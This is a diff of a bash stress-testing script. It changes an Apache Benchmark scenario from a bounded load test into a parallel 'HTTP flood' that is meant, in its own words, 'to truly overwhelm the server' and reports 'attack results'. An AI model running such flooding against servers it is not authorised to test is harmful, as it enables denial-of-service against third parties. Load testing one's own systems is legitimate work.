@@ -50,36 +50,80 @@ verify_target() {
     fi
 }
 
-# ── Scenario 1: Apache Benchmark (ab) HTTP load ───────────────
+# ── Scenario 1: Apache Benchmark (ab) HTTP flood ──────────────
 run_ab_load() {
-    local requests=${1:-1000}
-    local concurrency=${2:-${CONCURRENCY}}
-    local path=${3:-"/"}
+    local concurrency=${1:-${CONCURRENCY}}
+    local path=${2:-"/"}
+    # Number of parallel ab processes to run simultaneously
+    local parallel=${AB_PARALLEL:-4}
 
-    echo -e "\n${BOLD}${CYAN}═══ SCENARIO: HTTP Load (Apache Benchmark) ═══${RESET}"
-    echo -e "  Target     : ${TARGET_URL}${path}"
-    echo -e "  Requests   : ${requests}"
-    echo -e "  Concurrency: ${concurrency}"
+    echo -e "\n${BOLD}${CYAN}═══ SCENARIO: HTTP Flood (Apache Benchmark) ═══${RESET}"
+    echo -e "  Target        : ${TARGET_URL}${path}"
+    echo -e "  Duration      : ${DURATION}s (continuous)"
+    echo -e "  Concurrency   : ${concurrency} per stream"
+    echo -e "  Parallel      : ${parallel} streams"
+    echo -e "  Total Conns   : $((concurrency * parallel)) simultaneous"
     echo ""
 
     mkdir -p "${REPORT_DIR}"
     local outfile="${REPORT_DIR}/ab_report_${TIMESTAMP}.txt"
 
-    if ab \
-        -n "${requests}" \
-        -c "${concurrency}" \
-        -t "${DURATION}" \
-        -k \
-        -H "Accept-Encoding: gzip, deflate" \
-        -r \
-        "${TARGET_URL}${path}" \
-        | tee "${outfile}"; then
-        SCENARIO_RESULTS["Apache Benchmark (ab)"]="✅ Completed"
+    echo -e "${RED}[!] FLOODING — ${parallel} parallel streams x ${concurrency} connections = $((concurrency * parallel)) total${RESET}"
+    echo ""
+
+    # Launch multiple parallel ab processes to truly overwhelm the server
+    local pids=()
+    for i in $(seq 1 ${parallel}); do
+        ab \
+            -n 999999 \
+            -c "${concurrency}" \
+            -t "${DURATION}" \
+            -H "Accept-Encoding: gzip, deflate" \
+            -r \
+            "${TARGET_URL}${path}" \
+            > "${REPORT_DIR}/ab_stream${i}_${TIMESTAMP}.txt" 2>&1 &
+        pids+=($!)
+        echo -e "  ${YELLOW}[→] Stream ${i}/${parallel} launched (PID $!)${RESET}"
+    done
+
+    echo -e "\n  ${CYAN}[*] Waiting for all ${parallel} streams to complete (${DURATION}s)...${RESET}\n"
+
+    # Wait for all and collect results
+    local total_requests=0
+    local total_failed=0
+    local any_success=false
+    for pid in "${pids[@]}"; do
+        wait "$pid" 2>/dev/null || true
+    done
+
+    # Parse results from all streams
+    echo -e "\n${BOLD}${CYAN}═══ ATTACK RESULTS ═══${RESET}"
+    for i in $(seq 1 ${parallel}); do
+        local stream_file="${REPORT_DIR}/ab_stream${i}_${TIMESTAMP}.txt"
+        if [ -f "$stream_file" ]; then
+            local reqs=$(grep "Complete requests:" "$stream_file" 2>/dev/null | awk '{print $3}' || echo "0")
+            local failed=$(grep "Failed requests:" "$stream_file" 2>/dev/null | awk '{print $3}' || echo "0")
+            local rps=$(grep "Requests per second:" "$stream_file" 2>/dev/null | awk '{print $4}' || echo "0")
+            local avg_time=$(grep "Time per request:.*mean\b" "$stream_file" 2>/dev/null | head -1 | awk '{print $4}' || echo "0")
+            echo -e "  Stream ${i}: ${GREEN}${reqs}${RESET} requests | ${RED}${failed}${RESET} failed | ${YELLOW}${rps}${RESET} req/s | ${CYAN}${avg_time}${RESET} ms/req"
+            total_requests=$((total_requests + ${reqs:-0}))
+            total_failed=$((total_failed + ${failed:-0}))
+            any_success=true
+        fi
+    done
+
+    echo -e "\n  ${BOLD}TOTAL: ${GREEN}${total_requests}${RESET} requests | ${RED}${total_failed}${RESET} failed"
+
+    # Copy the first stream's full output as the main report
+    cp "${REPORT_DIR}/ab_stream1_${TIMESTAMP}.txt" "${outfile}" 2>/dev/null || true
+
+    if [ "$any_success" = true ]; then
+        SCENARIO_RESULTS["Apache Benchmark (ab)"]="✅ Completed (${total_requests} reqs, ${total_failed} failed)"
     else
         SCENARIO_RESULTS["Apache Benchmark (ab)"]="❌ Failed"
     fi
 
-    echo -e "\n${GREEN}[+] Apache Benchmark report saved to: ${outfile}${RESET}"
+    echo -e "\n${GREEN}[+] Apache Benchmark reports saved to: ${REPORT_DIR}/ab_stream*_${TIMESTAMP}.txt${RESET}"
 }
 
 # ── Scenario 2: Vegeta HTTP load ─────────────────────────────
